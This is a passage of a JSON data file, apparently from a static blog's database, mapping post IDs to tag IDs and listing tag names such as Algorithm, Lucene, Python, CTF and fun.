bf000urike40r1bj6k","_id":"cji4qizbi0012rike020q1emc"},{"post_id":"cji4qizb8000krikethdji3mx","tag_id":"cji4qizbh0011rike58ac7fqg","_id":"cji4qizbi0014rikete8q933a"},{"post_id":"cji4qizb9000mrike2yjzfhtw","tag_id":"cji4qizbc000prike0wssvvo5","_id":"cji4qizbi0016rikegvbpjm7i"},{"post_id":"cji4qizbb000orike4k1u57gi","tag_id":"cji4qizbi0015rike49b4i7wh","_id":"cji4qizbj0018rike8ycoljr1"},{"post_id":"cji4qizbc000qrikeet2f3i11","tag_id":"cji4qizbj0017rike1lm5685n","_id":"cji4qizbj001arikedx1nzk9v"},{"post_id":"cji4qizbd000srikeqtl8e18s","tag_id":"cji4qizbf000urike40r1bj6k","_id":"cji4qizbk001crikezmnz5z56"},{"post_id":"cji4qizbe000trikebiazb2bo","tag_id":"cji4qizbh0011rike58ac7fqg","_id":"cji4qizbk001erike8d26yl3k"},{"post_id":"cji4qizbf000wrikeun42i8rl","tag_id":"cji4qizbk001drikepur495sy","_id":"cji4qizbk001frikezemfqqi6"},{"post_id":"cjiei9k6f0000nskejhcu9nis","tag_id":"cji4qizbk001drikepur495sy","_id":"cjiei9k6k0001nskevzbaw10o"}],"Tag":[{"name":"Life","_id":"cji4qizav0004rikeuw496oyz"},{"name":"Algorithm","_id":"cji4qizb00008rike6aoxgaj9"},{"name":"Lucene","_id":"cji4qizb4000crikef6xtxnaw"},{"name":"编程珠玑","_id":"cji4qizb7000hrikeh2yqhj2y"},{"name":"生活","_id":"cji4qizbc000prike0wssvvo5"},{"name":"Notes","_id":"cji4qizbf000urike40r1bj6k"},{"name":"Python","_id":"cji4qizbh0011rike58ac7fqg"},{"name":"CTF","_id":"cji4qizbi0015rike49b4i7wh"},{"name":"python","_id":"cji4qizbj0017rike1lm5685n"},{"name":"fun","_id":"cji4qizbk001drikepur495sy"}]}}